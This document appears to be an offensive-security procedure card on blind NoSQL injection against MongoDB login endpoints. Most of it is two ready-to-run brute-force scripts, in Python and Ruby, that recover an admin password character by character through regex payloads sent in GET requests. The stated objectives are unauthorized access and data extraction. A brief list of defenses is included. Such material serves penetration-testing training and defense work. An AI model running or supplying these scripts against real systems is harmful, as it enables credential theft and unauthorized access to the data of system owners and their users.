---
id: f3f46d0f-7f5b-450c-8e19-957a97d31e62
name: Blind-NoSQL-Injection-via-Brute-Force
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:31.559677+00:00'
updated_at: '2023-04-10T20:23:02.733998+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Brute Force]]'
sub_techniques:
  - '[[Password Guessing]]'
tags:
  - blind-nosql
  - get
  - nosql-injection
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Blind-NoSQL-Injection-via-Brute-Force

## Summary

This procedure demonstrates a blind NoSQL injection attack targeting MongoDB login endpoints by brute-forcing passwords using regex patterns in GET requests. It exploits the lack of error messages in blind injections to iteratively guess password characters, allowing unauthorized access to the database without direct query feedback.

## Description

Blind NoSQL injection attacks target NoSQL databases like MongoDB by injecting malicious payloads into queries, but in blind variants, no direct database errors or data dumps are returned. Instead, this technique uses brute force to guess credentials by crafting regex patterns (e.g., password[$regex]=^prefix) that match partial passwords, observing application responses for success indicators like a specific string ('Yeah' in this case). This is effective against weak passwords and unpatched systems vulnerable to injection in authentication flows. The attack assumes the login endpoint accepts GET parameters for username and password, enabling regex-based matching. Technically, it leverages MongoDB's query language flexibility to inject regex without triggering visible errors. From a business perspective, successful attacks can lead to data breaches, exposing sensitive information and causing compliance issues.

## Requirements

1. Network access to the target web application hosting the NoSQL database (e.g., MongoDB).
2. Knowledge of the target username (e.g., 'admin') and the login endpoint URL.
3. Python or Ruby environment with required libraries (requests for Python, httpx for Ruby).
4. A character set for brute-forcing (e.g., alphanumeric plus common symbols).

## Defense

Defensive measures and detection strategies:

- Implement strong password policies with complexity requirements and enforce multi-factor authentication (MFA) for database access.
- Monitor application logs and network traffic for repeated login attempts, implementing rate limiting and CAPTCHA on authentication endpoints to thwart brute force.
- Sanitize and validate all user inputs in NoSQL queries, using parameterized queries or escaping mechanisms to prevent injection.
- Regularly patch NoSQL databases and web applications to address injection vulnerabilities, and conduct security audits on authentication flows.

## Objectives

1. Gain unauthorized access to the NoSQL database by brute-forcing login credentials.
2. Extract sensitive information from the database post-authentication.
3. Demonstrate the risks of unsanitized regex usage in NoSQL queries.

## Instructions

### Step 1: Prepare the Brute Force Environment

**Context**: Set up the scripting environment and identify the target login endpoint. Ensure the username is known and customize the character set to optimize the brute force (e.g., start with alphanumeric to reduce time).

Modify the script variables for username and URL. Run the script to begin iterative guessing.

**Code** ([[codes/Python-MongoDB-Blind-Injection-Brute-Force]]):

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

> This Python script uses the requests library to send GET requests with escalating regex patterns. It iterates through printable characters, excluding regex special characters to avoid query errors. Success is detected by the presence of 'Yeah' in the response, appending the matching character to the password. Expected output includes console prints of discovered characters as the password builds (e.g., "Found one more char : a", then "Found one more char : ad", etc.).

### Step 2: Execute Alternative Language Implementation

**Context**: For environments preferring Ruby or to cross-verify results, use the Ruby variant. This version allows custom character sets and uses persistent sessions for efficiency in repeated requests.

Adjust the username, URL, and CHARSET as needed. Execute the script to perform the brute force.

**Code** ([[codes/Ruby-MongoDB-Blind-Injection-Brute-Force]]):

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

> This Ruby script uses the httpx library with persistent sessions for faster requests. It loops through a defined CHARSET, skipping excluded regex characters, and checks for 'Yeah' in the response body. Expected output mirrors the Python version, printing progressive password discoveries. Use this if Python is unavailable or for performance testing with custom charsets.
